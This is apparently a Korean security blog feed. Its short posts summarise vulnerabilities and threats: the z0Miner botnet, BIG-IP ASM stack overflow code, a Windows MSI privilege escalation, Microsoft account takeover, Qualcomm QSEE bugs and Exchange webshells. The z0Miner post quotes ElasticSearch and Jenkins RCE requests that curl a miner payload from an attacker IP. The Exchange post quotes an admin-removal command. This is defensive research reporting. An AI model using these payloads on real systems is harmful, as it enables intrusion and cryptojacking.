사용합니다.</p><ul><li>OrderBy()</li></ul><pre><code class="hljs c">dx @$cursession.TTD.Calls(<span class="hljs-string">&quot;kernelbase!GetLastError&quot;</span>).OrderBy(c =&gt; c.TimeStart)</code></pre><p>TimeStart column으로 오름 차순 정렬을 하는 예제 query입니다. (사실 TimeStart로 오름 차순 정렬하는 건 의미가 없습니다. 이미 정렬 되어 있거든요.)</p><ul><li>OrderByDescending()</li></ul><pre><code class="hljs c">dx -r2 @$cursession.TTD.Calls(<span class="hljs-string">&quot;kernelbase!GetLastError&quot;</span>).OrderByDescending(c =&gt; c.TimeStart)</code></pre><p>TimeStart column으로 내림 차순 정렬을 하는 예제 query입니다.</p><h2 id="Specifying-elements-in-query"><a href="#Specifying-elements-in-query" class="headerlink" title="Specifying elements in query"></a>Specifying elements in query</h2><p>query에 append 된 element를 특정지어서 출력시킬 수 있습니다. First() 메소드를 사용해 첫 번째 element를 특정 짖거나 대괄호와 index number를 사용해 원하는 element를 특정할 수 있습니다.</p><pre><code class="hljs c">dx @$cursession.TTD.Calls(<span class="hljs-string">&quot;kernelbase!GetLastError&quot;</span>).First()dx @$cursession.TTD.Calls(<span class="hljs-string">&quot;kernelbase!GetLastError&quot;</span>)[<span class="hljs-number">0x0</span>]</code></pre><h2 id="Filtering-in-a-query"><a href="#Filtering-in-a-query" class="headerlink" title="Filtering in a query"></a>Filtering in a query</h2><p>SQL과 비슷하게 Where() 혹은 Select()를 사용해 query를 필터링할 수 있습니다. 아래 예제는 <code>kernelbase!GetLastError</code>의 호출중 리턴 값이 0이 아닌 데이터의 TimeStart값과 ReturnValue값을 출력하도록 필터링된 query입니다. Select() 메소드는 각 column의 display name을 지정해 줄 수도 있습니다. 메모리 커럽션 취약점을 찾을 때 string 관련 함수의 size 파라미터와 리턴 값이 다른 호출만 골라 볼 때 사용하기 유용합니다.</p><pre><code class="hljs c">dx -r2 @$cursession.TTD.Calls(<span class="hljs-string">&quot;kernelbase!GetLastError&quot;</span>).Where(c =&gt; c.ReturnValue != <span class="hljs-number">0</span>).Select(c =&gt; <span class="hljs-keyword">new</span> &#123; Time = c.TimeStart, Error = c.ReturnValue &#125;)</code></pre><h2 id="Assigning-query-to-a-variable"><a href="#Assigning-query-to-a-variable" class="headerlink" title="Assigning query to a variable"></a>Assigning query to a variable</h2><p>특정 query를 변수에 저장한 후 사용할 수 있어서 긴 query를 매번 입력할 필요가 없습니다.</p><pre><code class="hljs c">dx -r2 @$myResults = @$cursession.TTD.Calls(<span class="hljs-string">&quot;kernelbase!GetLastError&quot;</span>).Where(c =&gt; c.ReturnValue != <span class="hljs-number">0</span>).Select(c =&gt; <span class="hljs-keyword">new</span> &#123; Time = c.TimeStart, Error = c.ReturnValue &#125;)</code></pre><h1 id="마치며"><a href="#마치며" class="headerlink" title="마치며"></a>마치며</h1><p><img src="/2021/03/14/fabu1ous/ttd-3/14.png"></p><p>이걸로 “시간을 여행하는 해커를 위한 안내서” 시리즈가 끝났습니다. 이번에 TTD로 버그 바운티 하면서 느낀 건데 TTD 없으면 더 이상 리버싱을 못하는 몸이 돼버렸습니다. 작년엔 TTD 없이 리버싱을 어떻게 한 거지? 오히려 그때 더 리버싱을 잘했던 거 같기도 합니다. ㅎㅎ;; 아무튼 그만큼 TTD가 좋다!라고 결론 짓도록 하겠습니다. 이젠 진짜 익스 하러 가보겠습니다.</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>windbg</tag>
      
      <tag>time travel debugging</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] z0Miner: Mining Botnet Spreading quickly</title>
    <link href="/2021/03/13/fabu1ous/2021-03-13/"/>
    <url>/2021/03/13/fabu1ous/2021-03-13/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://blog.netlab.360.com/threat-alert-z0miner-is-spreading-quickly-by-exploiting-elasticsearch-and-jenkins-vulnerabilities/">Threat Alert: z0Miner Is Spreading quickly by Exploiting ElasticSearch and Jenkins Vulnerabilities</a></p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>최근 비트코인의 상승과 함께 다양한 채굴 봇넷 공격이 늘어났습니다. 대부분 감염 방식을 바꿨을 뿐 오래된 봇넷이며 그중 z0Miner도 포함되어 있습니다. z0Miner는 2가지 Weblogic RCE 취약점을 사용해 전파됩니다. z0Miner는 아래  두 취약점을 사용해 타겟 시스템에 <code>hxxp://27.1.1.34:8080/docs/conf.txt</code>를 설치하고 실행합니다.</p><ol><li><p>ElasticSearch RCE (CVE-2021-2015-1427)</p><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/&#123;VULN_URI&#125;</span> HTTP/1.1<span class="hljs-attribute">Host</span>: &#123;target&#125;:&#123;port&#125;&#123;...exec(\&quot;curl -fsSL http://27.1.1.34:8080/docs/conf.txt -o /tmp/baby\&quot;)...&#125;</code></pre></li></ol><ol start="2"><li><p>Jenkins script console RCE</p><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/&#123;VULN_URI&#125;</span> HTTP/1.1<span class="hljs-attribute">Host</span>: &#123;target&#125;:&#123;port&#125;curl+-fsSL+http%3A%2F%2F27.1.1.34:8080%2Fdocs%2Fconf.txt+-o+%2Ftmp%2Fsolr%22.execute%28%29.text&amp;json=%7B%22script%22%3A+%22println+%5C%22curl+-fsSL+http%3A%2F%2F27.1.1.34:8080%2Fdocs%2Fconf.txt+-o+%2Ftmp%2Fsolr%5C%22.execute%28%29.text%22%2C+%22%22%3A+%22%22%7D&amp;Submit=Run</code></pre></li></ol><p>타겟 시스템에 설치된 <code>hxxp://27.1.1.34:8080/docs/conf.txt</code>는 다음과 같은 동작을 합니다.</p><ol><li>타겟 시스템에 다른 채굴 봇넷이 존재하면 그 봇넷을 종료</li><li>추가 악성 스크립트를 설치</li><li>채굴 프로그램 설치 및 실행</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>botnet</tag>
      
      <tag>bitcoin</tag>
      
      <tag>monroe</tag>
      
      <tag>mining</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-22992: BIG-IP ASM의 stack buffer overflow 취약점</title>
    <link href="/2021/03/12/l0ch/2021-03-12/"/>
    <url>/2021/03/12/l0ch/2021-03-12/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2132">F5 Big IP - ASM stack-based buffer overflow in is_hdr_criteria_matches</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>BIG‑IP Application Security Manager</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Google project zero가 F5사의 웹 애플리케이션 방화벽(WAF) 솔루션인 BIG-IP ASM에서 발견한 stack 기반 buffer overflow 취약점의 세부 정보를 공개하였습니다.</p><p>BIG-IP ASM이 웹 방화벽의 기능을 제공하기 위해서는 response 헤더를 분석해야 합니다. 백엔드에서 반환된 모든 HTTP 헤더가 <code>is_hdr_criteria_matches</code> 함수에 전달되는데, 해당 함수에 취약점이 존재합니다.</p><pre><code class="hljs c"><span class="hljs-number">01</span>  <span class="hljs-keyword">uint32_t</span> nlen;<span class="hljs-number">02</span>  <span class="hljs-keyword">uint32_t</span> vlen;<span class="hljs-number">03</span>  <span class="hljs-keyword">char</span> buf [<span class="hljs-number">8264</span>];<span class="hljs-number">04</span> <span class="hljs-number">05</span>  nlen = <span class="hljs-number">8192</span>;<span class="hljs-number">06</span>  <span class="hljs-keyword">if</span> (hdr-&gt;nlen &lt;= <span class="hljs-number">8192</span>)<span class="hljs-number">07</span>    nlen = hdr-&gt;nlen; <span class="hljs-number">08</span>  extract_header_item (.., .., .., nlen, buf); <span class="hljs-number">09</span>  vlen = hdr-&gt;vlen;<span class="hljs-number">10</span>  buf[nlen] = <span class="hljs-string">&#x27;:&#x27;</span>;<span class="hljs-number">11</span>  buf[nlen + <span class="hljs-number">1</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<span class="hljs-number">12</span>  <span class="hljs-keyword">if</span> (<span class="hljs-number">8190</span>-nlen &lt;= vlen) <span class="hljs-number">13</span>   vlen = <span class="hljs-number">8190</span>-nlen;<span class="hljs-number">14</span>  extract_header_item (.., .., .., vlen, &amp;buf[nlen + <span class="hljs-number">2</span>]); <span class="hljs-number">15</span>  len = nlen + vlen + <span class="hljs-number">2</span>;<span class="hljs-number">16</span>  buf[len] = <span class="hljs-number">0</span>;</code></pre><p>HTTP 헤더 이름의 길이를 최대 8192까지 <code>nlen</code>에 저장합니다. 이후 구분자 <code>:</code> 및 공백을 추가한 뒤 12번째 줄 <code>if (8190-nlen &lt;= vlen)</code> 조건문에서 헤더 길이를 제한합니다. 그러나 <code>nlen</code>의 길이가 8190보다 클 경우 <code>8190-nlen</code>에서 unsigned로의 암시적 형 변환으로 인해 underflow 되어 UINT_MAX에 가까운 결과가 됩니다. 결과적으로 헤더 길이 제한에 실패하고 <code>extract_header_item</code> 함수에서 stack buffer overflow가 발생해 원격 코드 실행으로 이어집니다.</p><p>해당 취약점은 Request smuggling 또는 HTTP header injection과 같은 취약점으로 헤더 길이를 조작해 트리거할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>buffer overflow</tag>
      
      <tag>L0ch</tag>
      
      <tag>integer underflow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Third-Party products를 활용한 Windows MSI 권한 상승 취약점</title>
    <link href="/2021/03/11/idioth/2021-03-11/"/>
    <url>/2021/03/11/idioth/2021-03-11/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://improsec.com/tech-blog/the-many-pitfalls-of-windows-msi-privilege-escalation-in-windows-78110server-and-a-range-of-third-party-products">The many pitfalls of Windows MSI - Privilege escalation in Windows 7/8.1/10/Server and a range of third-party products</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows 7/8.1/10</li><li>Windows Server 2008/2012/2016/2019</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft Windows의 소프트웨어 설치, 유지, 제거를 위한 인스톨러인 MSI에서 서드 파티 애플리케이션을 통해 권한 상승을 할 수 있는 취약점이 발견되었습니다.</p><p>MSI 패키지가 설치되는 동안 패키지의 복사본은 자동으로 생성된 이름을 갖고 숨김 폴더 <code>C:\Windows\Installer</code>에 생성됩니다. 시스템에 있는 모든 사용자들은 <code>msiexec /fa C:\Windows\Installer\&lt;filename&gt;.msi</code> 명령을 실행하거나 관련된 API/COM 함수를 직접적으로 호출하여 패키지를 재설치할 수 있습니다.</p><p>패키지에 따라 재설치할 때 <code>NT Authority/SYSTEM</code> 컨텍스트로 새로운 MSIEXEC 프로세스를 생성합니다. 설치된 서드 파티 애플리케이션을 재설치하는 동안 <code>NT Authority/SYSTEM</code> 컨텍스트에서 <code>cmd.exe</code>가 호출됩니다. 해당 프로세스가 실행되는 동안 프로세스에 낮은 권한의 사용자에 속하는 환경 변수가 적용되어있습니다. <code>C:\Windows\System32\cmd.exe</code>로 설정되어 있는 변수 <code>ComSpec</code>의 값을 변경하면 <code>NT Authority/SYSTEM</code> 권한으로 <code>ComSpec</code>에 설정된 애플리케이션이 실행됩니다.</p><p><img src="/2021/03/11/idioth/2021-03-11/1.png"></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>lpe</tag>
      
      <tag>idioth</tag>
      
      <tag>msi</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Microsoft online service account takeover</title>
    <link href="/2021/03/10/fabu1ous/2021-03-10/"/>
    <url>/2021/03/10/fabu1ous/2021-03-10/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://thezerohack.com/how-i-might-have-hacked-any-microsoft-account">How I Might Have Hacked Any Microsoft Account</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Microsoft 계정</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Microsoft 계정의 계정 복구(비밀번호 재설정) 기능에서 account takeover 취약점이 발견되고 패치되었습니다. Microsoft 계정의 비밀번호를 재설정하기 위해선 email 혹은 휴대폰으로 보안 문자를 받아 입력하는 인증 절차를 거쳐야 합니다. 보안 문자는 7자리 숫자로 총 10^7 (천만) 개의 경우의 수가 있습니다.</p><p>당연히 Brute force 공격을 방지하기 위해 보안 문자 인증 시도 횟수를 제한하지만 여러 IP를 이용한 Web Application Race condition을 통해 우회가 가능합니다. 여러 IP 주소로부터 동시에 인증 request를 보내는 방법을 통해 제한 횟수를 넘어선 인증 시도를 할 수 있습니다.</p><p>해당 공격을 성공적으로 수행하기 위해선 다음과 같은 조건을 만족해야 합니다.</p><ol><li>Request의 암호화 방식에 대한 지식 필요함.</li><li>충분한 개수의 IP 주소가 필요함.</li><li>모든 request가 Microsoft Server에 동시에 도달해야 함.</li></ol><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://thezerohack.com/hack-any-instagram">https://thezerohack.com/hack-any-instagram</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>race condition</tag>
      
      <tag>microsoft</tag>
      
      <tag>brute force</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] 퀄컴 SoC의 보안 실행 환경 QSEE에서 발견된 4가지 취약점</title>
    <link href="/2021/03/09/l0ch/2021-03-09/"/>
    <url>/2021/03/09/l0ch/2021-03-09/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://raelize.com/blog/qualcomm-ipq40xx-analysis-of-critical-qsee-vulnerabilities/">Qualcomm IPQ40xx: Analysis of Critical QSEE Vulnerabilities</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Qualcomm IPQ40xx Series</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Linksys, Netgear 및 Cisco 등 여러 제조업체에서 사용하는 Qualcomm의 SoC인 IPQ40xx 시리즈 칩에서 발견된 여러 취약점들의 세부 정보가 공개되었습니다.</p><p>퀄컴은 프로세서와 주변 하드웨어 장치의 안정성을 위해 다음과 같이 실행 환경을 분리합니다.</p><ul><li>QSEE(Qualcomm Secure Execution Environment) : 퀄컴의 <a href="https://ko.wikipedia.org/wiki/%EC%8B%A0%EB%A2%B0_%EC%8B%A4%ED%96%89_%ED%99%98%EA%B2%BD">Trusted Execution Environment(신뢰 실행 환경)</a>으로, 일반 실행 환경과 격리된 보안 영역이 제공하는 실행 환경이며 QSEE와 관련된 코드 및 데이터는 REE에서 액세스가 불가능합니다.</li><li>REE(Rich Execution Environment) : 일반 실행 환경</li></ul><h3 id="CVE-2020-11256"><a href="#CVE-2020-11256" class="headerlink" title="CVE-2020-11256"></a>CVE-2020-11256</h3><p>SMC 핸들러 <code>tzbsp_blow_fuses_and_reset()</code> 은 두 개의 인자 <code>arg1</code>, <code>arg2</code>를 받습니다. 해당 함수는 <code>arg2</code>를 역참조해 1 또는 2를 기록하는데, <code>arg2</code>가 REE 영역의 메모리를 가리키는지 확인하지 않습니다.</p><h3 id="CVE-2020-11257"><a href="#CVE-2020-11257" class="headerlink" title="CVE-2020-11257"></a>CVE-2020-11257</h3><p>SMC 핸들러 <code>usb_calib()</code> 의 인자 <code>arg1</code>는 삭제되지 않은 출력 포인터로, <code>arg1</code>는 메모리 <code>0x580e0</code>의 값인 <code>0x787</code>을 쓰기 위해 역참조 되며  <code>arg1</code>이 REE 영역의 메모리를 가리키는지 확인하지 않습니다.</p><h3 id="CVE-2020-11258"><a href="#CVE-2020-11258" class="headerlink" title="CVE-2020-11258"></a>CVE-2020-11258</h3><p>SMC 핸들러 <code>tzbsp_version_set()</code> 함수는 네 개의 인자를 받으며 인자 값에 따라  <code>arg3</code>를 역참조해 <code>0x0</code>, <code>0x5</code>, <code>0xfffffffc</code> 중 하나를 씁니다. 이때 <code>arg3</code>가 REE 영역의 메모리를 가리키는지 확인하지 않습니다.</p><h3 id="CVE-2020-11259"><a href="#CVE-2020-11259" class="headerlink" title="CVE-2020-11259"></a>CVE-2020-11259</h3><p>SMC 핸들러 <code>tzbsp_version_set()</code> 함수는 세 개의 인자를 받습니다. 이 중 <code>arg2</code>에는 <code>sub_87e90370</code> 의 반환 값 또는 <code>sub_87e90370 | 0xF0000</code> 값을,<code>arg3</code>에는 <code>0x0</code>을 쓰기 위해 각각 역참조 합니다. 이때 <code>arg2</code>와 <code>arg3</code>가 REE 영역의 메모리를 가리키는지 확인하지 않습니다.</p><p>위 네 가지 취약점은 모두 <code>SMC(Secure Monitor Call)</code> 핸들러에서 발생한다는 점과 인자로 전달된 포인터가 REE 영역의 메모리인지 확인하지 않는다는 공통점이 존재합니다. 취약점을 악용하면 QSEE가 액세스 가능한 임의의 주소에 제한된 쓰기가 가능하며 QSEE에 구현된 보안 기법을 우회해 커널 및 하드웨어에 직접 액세스 할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>qualcomm</tag>
      
      <tag>L0ch</tag>
      
      <tag>limited memory overwrite</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Microsoft Exchange server 제로 데이 취약점 악용</title>
    <link href="/2021/03/08/idioth/2021-03-08/"/>
    <url>/2021/03/08/idioth/2021-03-08/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.fireeye.com/blog/threat-research/2021/03/detection-response-to-exploitation-of-microsoft-exchange-zero-day-vulnerabilities.html">Detection and Response to Exploitation of Microsoft Exchange Zero-Day Vulnerabilities</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>2021년 3월 2일 자 패치 이전의 Microsoft Exchange Server<ul><li>2013 Cumulative Update 23</li><li>2016 Cumulative Update 18</li><li>2016 Cumulative Update 19</li><li>2019 Cumulative Update 7</li><li>2019 Cumulative Update 8</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft Exchange Server의 제로 데이 취약점을 악용한 공격이 발견되었습니다. 발견된 행위는 접속 유지를 위한 웹 쉘 생성, 원격 코드 실행, 엔드 포인트 보안 솔루션 탐지입니다.</p><p>2021년 1월에 발견된 <code>help.aspx</code> 웹 쉘은 FireEye xAgent, CarbonBlack, CrowdStrike Falcon 엔드 포인트 제품을 탐지하고 존재 여부를 작성하는 코드를 포함합니다. 해당 웹 쉘은 CVE-2021-26858을 악용하여 Microsoft Exchange Server의 통합 메시징 서비스인 <code>UMWorkerProcess.exe</code>를 통해 생성됩니다.</p><p>다른 곳에서 발견된 <code>iisstart.apsx</code> 웹 쉘은 부분적으로 난독화되어 있으며, 파일 시스템과 통신하기 위한 기능, 임의 명령 실행, 업로드, 삭제, 파일 내용 확인 등의 기능을 포함합니다.</p><p>2021년 3월에는 Exchange Server의 여러 취약점을 악용하여 여러 개의 웹 쉘이 업로드되었습니다. 해당 웹 쉘은 Exchange 웹 프론트 엔드와 관련된 IIS 프로세스인 <code>w3wp.exe</code>가 <code>cmd.exe</code>를 생성하게 만듭니다.</p><p>위의 발견된 웹 쉘 다수는 <code>Exchange Organization administrators</code> 그룹에서 <code>administrator</code> 사용자를 삭제하는 <code>net group &quot;Exchange Organization administrators&quot; administrator /del /domain</code> 명령을 수행합니다. 단일 시스템 도메인을 사용하면, 로컬에서 해당 명령이 수행됩니다.</p><p>Microsoft에서 밝힌 추가적인 악용 행위는 다음과 같습니다.</p><ul><li>LSASS 프로세스 메모리 덤프를 통한 자격 증명 도용</li><li>7zip을 사용하여 유출 데이터 압축</li><li>Exchange PowerShell Snapin을 통해 mailbox data 전송</li><li>원격 접속을 위해 추가적으로 Covenant, Nishang, PowerCat 사용</li></ul><p>Exchange Server가 웹 쉘에 공격을 받았는지 확인하는 방법은 다음과 같습니다.</p><ul><li><code>C:\Windows\System32\inetsrv\w3wp.exe</code> 프로세스가 <code>cmd.exe</code> 자식 프로세스를 가짐</li><li><code>w3wp.exe</code>나 <code>UMWorkerProcess.exe</code>에 의해 파일이 생성</li><li><code>SYSTEM</code> 사용자가 소유한 ASPX 파일이 존재</li><li><code>Temporary ASP.NET Files</code> 디렉터리에 처음 보는 컴파일된 ASPX 파일 존재</li><li>다음 리소스에 대해 외부 IP를 검사합니다.<ul><li><code>/rpc/</code> 디렉터리</li><li><code>/ecp/DDI/DDIService.svc/SetObject</code></li><li>존재하지 않는 리소스</li><li>의심스럽거나 스푸핑 된 HTTP User-Agents</li></ul></li><li>메일 박스로 내보내는 예상치 못하거나 의심스러운 Exchange PowerShell Snapin request가 존재</li></ul>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>microsoft</tag>
      
      <tag>idioth</tag>
      
      <tag>webshell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] 버그헌팅 튜토리얼 Part 1</title>
    <link href="/2021/03/07/l0ch/bughunting-tutorial/"/>
    <url>/2021/03/07/l0ch/bughunting-tutorial/</url>
    
    <content type="html"><![CDATA[<p>안녕하세요 L0ch입니다! 오늘은 특별한 글을 가져와봤어요 ㅋㅋㅋ 바로 대학교 동아리 대-선배님의 버그헌팅에 대한 꿀팁이 담겨있는 글입니다!</p><p>때는 2018년.. 아직 새내기 티를 벗어나지 못한 저에게</p><blockquote><p>윈도우 취약점 찾아볼래?</p></blockquote><p>라며 올려주신 글입니다 ㅎㅎ..  버그헌팅에 대한 소개부터, 대상 선정-분석-익스플로잇 까지 버그헌팅 뉴비도 이해할 수 있도록 친절하게 설명이 되어 있어 도움이 많이 되었죠. (그땐 몰랐지 앞으로 윈도우로 고통받게 될지…..)</p><p>여튼 그래서 허락을 구하고 올리게 되었으며 시리즈가 긴 만큼 나누어서 올릴 예정입니다. 게시를 허락해주신 선배님께 다시 한번 감사의 말씀을 드리며 시작하겠습니다!</p><hr><h1 id="서론"><a href="#서론" class="headerlink" title="서론"></a>서론</h1><p>음 버그헌팅 튜토리얼이라는 거창한 제목을 해도 될지 모르겠지만 ㅋㅋㅋ 제가 찾았던 취약점을 예시로 버그헌팅 과정에 대해서 얘기해 보고자 합니다.</p><p>뭐 대단한 게 아니라 그냥 제가 어떻게 취약점을 찾았고 익스플로잇을 어떻게 했는지 정도? 키사 보고서 쓰는 팁도 좀 써보려고 하다가 그냥 보고서는 최대한 자세히 많이 쓰는 게 답인 거 같아 이 부분은 빼고 얘기할 거 같네요 ㅋㅋ</p><p>최근에는 공유기랑 뭐 IOT가 대세여서 주변에 이렇게 윈도우 프로그램 버그 헌팅하시는 분들을 많이 봤지만 윈도우 프로그램 버그헌팅을 시작하시려는 분들께 도움이 되었으면 합니다 ㅎㅎ (그래도 공유기가 개꿀임 ㅠㅠ)</p><p>이 글은 읽으시는 분들이 기본적으로 해킹에 대한 기본지식이 있다는 전제 하에 쓰겠습니다. 워게임도 풀어보고 리버싱 좀 할 수 있고 정도….? 그리고 버그헌팅을 아예 안 해보신 분들? 애매하지만… 그래도 최대한 쉽게 자세하게 쓰려고 노력해볼게요.</p><h1 id="※-글-읽을-때-주의사항-※"><a href="#※-글-읽을-때-주의사항-※" class="headerlink" title="※ 글 읽을 때 주의사항 ※"></a>※ 글 읽을 때 주의사항 ※</h1><ol><li>이 글은 제 경험을 바탕으로 쓰는 것이기 때문에 혹시 더 좋은 방법이나 아이디어 있으신 분은 댓글을 달아주시면 감사하겠습니다.</li><li>이 글의 흐름은 제 의식의 흐름과 같습니다. 중간에 이야기가 딴 데로 새거나 오타가 있거나 아니면 개소리를 하거나….</li><li>최대한 제가 했던 방법들을 모두 써낼 것이기 때문에 실패하는 과정도 쓸 생각입니다. 그렇기 때문에 처음 볼 때부터 직접 하면서 따라가기보다는 한 번 쓱 보고 따라 해 보시는 걸 추천드립니다</li><li>제가 문과도 아니거니와 학창 시절의 절반 이상을 중궈에서 보냈기 때문에 한쿸말이 쵸금 부족합니데스.</li></ol><p>뭐 암튼 시작하겠습니당 ㅋㅋ</p><h1 id="목차"><a href="#목차" class="headerlink" title="목차"></a>목차</h1><h3 id="part-1"><a href="#part-1" class="headerlink" title="part 1"></a>part 1</h3><ol><li>버그헌팅이란?</li><li>버그 바운티</li><li>취약점을 찾기 전에</li><li>취약점을 찾는 방법</li><li>타깃 선정</li><li>시드 파일</li></ol><h3 id="To-be-Continued…"><a href="#To-be-Continued…" class="headerlink" title="To be Continued…"></a>To be Continued…</h3><ol><li>버그 바운티 - KMPlayer</li><li>From Crash to Exploit</li><li>잡담</li></ol><h1 id="버그헌팅이란"><a href="#버그헌팅이란" class="headerlink" title="버그헌팅이란?"></a>버그헌팅이란?</h1><p>소프트웨어나 웹 서비스 등의 취약점을 제보해 금전적인 보상, 해커의 명예 획득 등 이득을 노리는 일련의 행위입니다. 뭐 그러니까 결국 취약점을 신나게 찾고 돈도 받고 크래딧도 받고 ㄱㅇㄷ</p><p>국내의 경우 주의해야 할 점은 서비스 중인 웹 사이트 혹은 서버에 대한 공격은 불법이므로 웹 버그헌팅은 좀 힘들겠네요 ㅠㅠ 하지만 제가 알기로는 네이버는 가능한 걸로 알고 있습니다.</p><h1 id="버그-바운티"><a href="#버그-바운티" class="headerlink" title="버그 바운티"></a>버그 바운티</h1><p>해커들이 제보한 취약점에 대한 보상을 해주는 제도입니다.</p><h2 id="1-각-회사별-버그-바운티"><a href="#1-각-회사별-버그-바운티" class="headerlink" title="1) 각 회사별 버그 바운티"></a>1) 각 회사별 버그 바운티</h2><p>외국 같은 경우에는 각 회사(다는 아니지만)마다 버그 바운티를 운영하고 있습니다. 다들 잘 아시겠지만 대표적으로 구글, 페이스북, 애플 등등 웬만한 아는 기업들은 다 버그 바운티를 운영하고 있습니다. 물론 자사의 프로그램의 대해서만 운영하고 있죠. 하지만 각자 운영 룰은 조금씩 다릅니다.</p><p>예를 들어 어디는 자사 프로그램의 크래시만 받는 곳도 있지만 어디는 풀 익스까지 있어야지만 보상을 해주는… 아니면 크래딧만 주고 리워드는 없는…. 뭐 그런 거는 각 회사의 홈페이지에서 확인을 하시면 됩니다.</p><p><a href="https://www.bugcrowd.com/bug-bounty-list/">https://www.bugcrowd.com/bug-bounty-list/</a></p><p>위 링크를 들어가시면 버그 바운티를 운영하고 있는 회사들의 리스트와 운영 방식이 간단하게 정리되어 있습니다. 관심 있으신 분들은 참고하시면 될 거 같아요.</p><h2 id="2-제로디움-ZDI-해커원-등"><a href="#2-제로디움-ZDI-해커원-등" class="headerlink" title="2) 제로디움, ZDI, 해커원 등"></a>2) 제로디움, ZDI, 해커원 등</h2><p>타 회사의 취약점도 제보받는 버그 바운티입니다. 보상이 쌘 걸로 유명하죠. 제로디움의 보상금액을 한번 볼까요?</p><p><img src="/2021/03/07/l0ch/bughunting-tutorial/image1.png"></p><blockquote><p>출처 : 제로디움</p></blockquote><p>그냥 봐도 상당히 세죠?? ㅎㄷㄷ</p><p>기본적으로 $10,000 면 지금 환율로 계산해보면 천만 원이 넘네요;;; 하지만 그만큼 쉬운 타깃은 하나도 없네요 ㅠㅠ 그리고 기본적으로 다들 풀 익스를 해서 보내야 하기 때문에 더더욱 힘듭니다.</p><p>해커원 같은 경우는 제로디움과 ZDI 와는 다르게 웹 서비스에 대해서만 버그 바운티를 진행하고 있습니다. 국내에서 웹 버그 바운티를 못해서 아쉬운 분들은 해커원 버그 바운티를 시도해보는 것이 좋을 듯합니다 ㅎㅎ</p><h2 id="3-KISA-S-W-신규-취약점-포상-신고제"><a href="#3-KISA-S-W-신규-취약점-포상-신고제" class="headerlink" title="3) KISA S/W 신규 취약점 포상 신고제"></a>3) KISA S/W 신규 취약점 포상 신고제</h2><p>전 세계적으로 유일하게 국가기관이 운영하고 있는 버그 바운티 프로그램입니다.(라고 발표에서 들었던 게 생각이 나네요) 그리고 국내에서 몇 없는 버그 바운티 중 하나이기도 하죠 ㅋㅋ</p><p>키사를 제외하고 삼성이나 다른 몇몇 회사에서도 버그 바운티를 운영하고 있지만 대상이 제한적인 걸로 기억합니다. 저는 개인적으로 키사에서 운영하는 버그 바운티가 제일 괜찮은 거 같네요.(애용하고 있습니다 ㅎㅎ 많이 제보하지는 않았지만…)</p><p><a href="https://www.krcert.or.kr/consult/software/vulnerability.do?orgSiteUrl=https://www.krcert.or.kr">https://www.krcert.or.kr/consult/software/vulnerability.do?orgSiteUrl=https://www.krcert.or.kr</a></p><p>위 링크에 들어가서 신고서 양식을 다운로드해 양식대로 작성하고 제보하시면 됩니다. 